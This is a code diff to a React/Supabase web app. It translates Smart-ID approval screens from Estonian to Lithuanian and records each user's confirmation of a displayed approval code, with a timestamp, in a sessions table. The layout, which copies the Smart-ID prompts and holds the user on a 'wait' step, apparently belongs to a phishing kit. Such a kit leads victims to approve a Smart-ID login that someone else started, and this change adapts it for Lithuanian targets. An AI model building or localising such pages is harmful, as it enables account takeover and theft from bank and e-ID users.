@@ -111,7 +111,7 @@ function SmartIdApprovalCard({
             Atidarykite Smart-ID programėlę savo telefone.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Kinnitage {pinLabel}-koodiga</p>
+          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
@@ -152,15 +152,15 @@ function GenericApprovalCard({
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
         <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
-        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Kinnitamine on vajalik</h1>
-        <p className="mb-6 text-base text-[#667085]">Jätkamiseks kinnitage oma seadmes kuvatud kontrollkood.</p>
+        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Būtinas patvirtinimas</h1>
+        <p className="mb-6 text-base text-[#667085]">Norėdami tęsti, patvirtinkite savo įrenginyje rodomą patvirtinimo kodą.</p>
 
         <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
           {approvalCode || "0000"}
         </div>
 
         <p className="mb-6 text-sm text-[#667085]">
-          Jäänud aeg: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+          Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
         </p>
 
         <button
@@ -169,7 +169,7 @@ function GenericApprovalCard({
           disabled={saving}
           className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
         >
-          {saving ? "Kinnitan..." : "Kinnita"}
+          {saving ? "Patvirtinama..." : "Patvirtinti"}
         </button>
       </div>
     </div>
@@ -406,9 +406,10 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     setSaving(true);
     const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
     const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
+    const confirmedStatus = `${viewState.approvalStatus}_confirmed`;
     const nextApprovalHistory = [
       ...parseApprovalHistory(previousFormData.approvalHistory),
-      viewState.approvalStatus,
+      confirmedStatus,
     ].filter((item) => item && item.trim().length > 0);
 
     const { error } = await supabase
@@ -418,8 +419,9 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         current_step: "wait",
         form_data: {
           ...previousFormData,
-          approvalStatus: viewState.approvalStatus,
+          approvalStatus: confirmedStatus,
           approvalCode: viewState.approvalCode,
+          approvalConfirmedAt: new Date().toISOString(),
           approvalHistory: JSON.stringify(nextApprovalHistory),
         },
       })
